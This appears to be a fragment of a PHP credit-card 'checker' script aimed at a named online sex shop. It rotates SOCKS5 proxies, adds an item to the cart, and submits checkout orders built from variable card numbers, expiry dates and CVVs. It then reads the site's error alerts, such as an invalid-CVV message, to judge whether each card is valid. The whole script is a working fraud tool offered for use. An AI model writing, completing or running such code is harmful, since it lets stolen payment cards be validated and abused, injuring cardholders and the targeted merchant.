...
$proxies = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];
 ...
 //==================[Curl Request]======================//
$response = CurlX::Post(
    "https://maltasexshop.com/cart.php",
    'qty=1&item_id=51742&add_qty=',
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://maltasexshop.com',
        'referer: https://maltasexshop.com/fetish-fashion-mouth-hood-wht-p76806.html',
...
$response = CurlX::Get(
    "https://maltasexshop.com/checkout.php?fb=76806|1,",
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9',
        'referer: https://maltasexshop.com/cart.php',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies,
...
$response = CurlX::Post(
    "https://maltasexshop.1r4.com/place-order.php",
    'shipping_address_id=0&email='.urlencode($email).'&email2='.urlencode($email).'&shipping_first_name='.$firstName.'&shipping_last_name='.$lastName.'&shipping_street='.urlencode($street).'&shipping_street_ln_2=&shipping_city='.urlencode($city).'&shipping_state_code=NY&shipping_zip_code='.$zip.'&shipping_country_code=US&phone='.urlencode($phone).'&shipping_method=Standard+%283-10+business+days%29&sameas=1&address_id=0&first_name=&last_name=&street=&street_ln_2=&city=&zip_code=&country_code=US&newsletter=1&card_id=0&payment_method=1&card_name=alex&card_number='.$cc.'&card_type=Visa&expmonth='.$mes.'&expyear='.$ano.'&cvv='.$cvv.'&place_order=1',
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://maltasexshop.1r4.com',
        'referer: https://maltasexshop.1r4.com/place-order.php',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
...
$alerts = $dom->getElementsByTagName('div');
$lastAlertText = null;

foreach ($alerts as $alert) {
    if ($alert->getAttribute('class') == 'alert') {
         $errormessage = $alert->textContent;
...
} elseif ($errormessage == "This transaction cannot be processed. Please enter a valid Credit Card Verification Number.") {
